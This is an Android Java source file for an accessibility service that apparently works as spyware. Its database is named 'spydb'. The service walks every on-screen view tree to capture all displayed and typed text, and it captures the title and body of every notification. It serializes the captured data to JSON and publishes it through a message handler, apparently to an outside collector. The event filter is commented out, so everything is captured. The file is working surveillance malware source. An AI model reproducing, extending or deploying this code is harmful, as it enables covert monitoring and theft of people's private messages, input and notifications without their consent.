package com.example.myapplication;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.icu.util.Calendar;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import androidx.room.Room;

import com.example.myapplication.database.AppDatabase;
import com.google.gson.Gson;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;

interface IJson {
    String toJson();
}

class AccessibilityNodeData {
    int level;
    String data;
    String viewIdResourceName;

    AccessibilityNodeData(int level, String data, String viewIdResourceName) {
        this.data = data;
        this.level = level;
        this.viewIdResourceName = viewIdResourceName;
    }
}

class AccessibilityEventData implements IJson {
    long timestamp;
    String packageName;
    int eventType;
    String eventTypeName;
    List<AccessibilityNodeData> textData;

    AccessibilityEventData(AccessibilityEvent accessibilityEvent, AccessibilityNodeInfo mNodeInfo) {
        this.timestamp = accessibilityEvent.getEventTime();
        this.eventType = accessibilityEvent.getEventType();
        this.eventTypeName = AccessibilityEvent.eventTypeToString(this.eventType);
        this.packageName = mNodeInfo.getPackageName().toString();
        this.textData = new ArrayList<AccessibilityNodeData>();
        this.populateTextData(mNodeInfo);
    }

    private void populateTextData(AccessibilityNodeInfo mNodeInfo) {
        this.populateTextData(mNodeInfo, 0);
    }

    private void populateTextData(AccessibilityNodeInfo mNodeInfo, int depth) {
        if (mNodeInfo == null) return;

        this.textData.add(new AccessibilityNodeData(
                depth, "" + mNodeInfo.getText(), mNodeInfo.getViewIdResourceName()
        ));

        if (mNodeInfo.getChildCount() < 1) return;
        for (int i = 0; i < mNodeInfo.getChildCount(); i++) {
            this.populateTextData(mNodeInfo.getChild(i), depth + 1);
        }
    }

    public String toJson() {
        return new Gson().toJson(this);
    }
}

class NotificationEventData implements IJson {
    String eventTypeName;
    int eventType;
    long timestamp;
    String title;
    String text;
    String text2;
    String packageName;

    NotificationEventData(AccessibilityEvent accessibilityEvent, Notification notification) {
        this.title = notification.extras.getCharSequence(Notification.EXTRA_TITLE).toString();
        this.text = notification.extras.getCharSequence(Notification.EXTRA_TEXT).toString();
        this.text2 = notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT).toString();
        this.eventType = accessibilityEvent.getEventType();
        this.eventTypeName = AccessibilityEvent.eventTypeToString(this.eventType);
        this.packageName = accessibilityEvent.getPackageName().toString();
        this.timestamp = accessibilityEvent.getEventTime();
    }

    public String toJson() {
        return new Gson().toJson(this);
    }
}

public class MyService extends AccessibilityService {

    HashSet<Integer> allowedEventTypes = new HashSet<>(Arrays.asList(
            //Add events to listen to here.
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.WINDOWS_CHANGE_ADDED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.CONTENT_CHANGE_TYPE_SUBTREE,
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED

    ));

    static String TAG = "TESTSERVICE";

    protected void BuildDatabase() {
        if (InstallationConfiguration.appDatabase == null) {
            InstallationConfiguration.appDatabase = Room.databaseBuilder(getApplicationContext(),
                    AppDatabase.class, "spydb").build();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
//        if (!allowedEventTypes.contains(accessibilityEvent.getEventType())) return;
        IJson payload;
        switch (accessibilityEvent.getEventType()) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                Notification notification = (Notification) accessibilityEvent.getParcelableData();
                if (notification == null) return;
                payload = new NotificationEventData(accessibilityEvent, notification);
                break;
            default:
                AccessibilityNodeInfo mNodeInfo = accessibilityEvent.getSource();
                if (mNodeInfo == null) return;
                mNodeInfo.refresh();
                printeverything(mNodeInfo, 0);
                payload = new AccessibilityEventData(accessibilityEvent, mNodeInfo);
        }
        //Log.i("JSON" + TAG, payload.toJson());
        MessageHandler.getMessageHandlerInstance().tryPublishData("events", payload.toJson());
    }

    public void printeverything(AccessibilityNodeInfo node, int depth) {
        if (node == null) return;
        String print = "\ndepth:"+depth;
        for (int i = 0; i < depth; i++) print += "\t";
        print += "name:" + node.getViewIdResourceName();
        print += " ";
        print += "text:" + node.getText();
        Log.i("TESTREQ", print);
        for (int j = 0; j < node.getChildCount(); j++) {
            printeverything(node.getChild(j), depth + 1);
        }
    }


    @Override
    public void onInterrupt() {
        Log.i(TAG, "Accessibility Interrupted");
    }

    @Override
    public void onServiceConnected() {
        Log.i("TESTSERVICE", "Hello!");
        this.BuildDatabase();
        Toast.makeText(this, "started", Toast.LENGTH_SHORT).show();
    }

    private void reduceNodeText(AccessibilityNodeInfo mNodeInfo) {
        reduceNodeText(mNodeInfo, 0);
    }

    private void reduceNodeText(AccessibilityNodeInfo mNodeInfo, int depth) {
        if (mNodeInfo == null) return;
        String reducedString = "d:" + String.valueOf(depth);
        reducedString += "(" + mNodeInfo.getText() + " <-- " +
                mNodeInfo.getViewIdResourceName() + ")";
        Log.i(TAG, reducedString);
        if (mNodeInfo.getChildCount() < 1) return;
        for (int i = 0; i < mNodeInfo.getChildCount(); i++) {
            reduceNodeText(mNodeInfo.getChild(i), depth + 1);
        }
    }
}